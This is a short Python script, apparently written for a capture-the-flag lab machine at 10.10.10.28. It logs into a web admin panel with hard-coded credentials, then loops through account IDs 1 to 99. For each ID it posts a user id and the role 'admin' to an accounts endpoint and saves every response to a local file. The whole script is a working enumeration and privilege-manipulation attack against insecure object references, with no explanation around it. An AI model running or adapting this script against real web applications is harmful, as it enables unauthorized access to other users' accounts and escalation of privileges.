from urllib.request import build_opener, HTTPCookieProcessor
from urllib.parse import urlencode
from http.cookiejar import CookieJar

opener = build_opener(HTTPCookieProcessor(CookieJar()))

name, password = 'admin', 'MEGACORP_4dm1n!!'

post = {
    'username': name,
    'password': password
}
data = urlencode(post).encode('utf-8')

res = opener.open('http://10.10.10.28/cdn-cgi/login/index.php', data)
res.close()

for i in range(1, 100):
    url = "http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=" + str(i)
    user, role = 34322, 'admin'
    post = {
        'user': user,
        'role': role
    }
    data = urlencode(post).encode('utf-8')

    res = opener.open(url, data)
    with open('id.html', mode='a') as f:
        f.write('<h1>' + url + '</h1>')
        f.write(str(res.read()))
    res.close()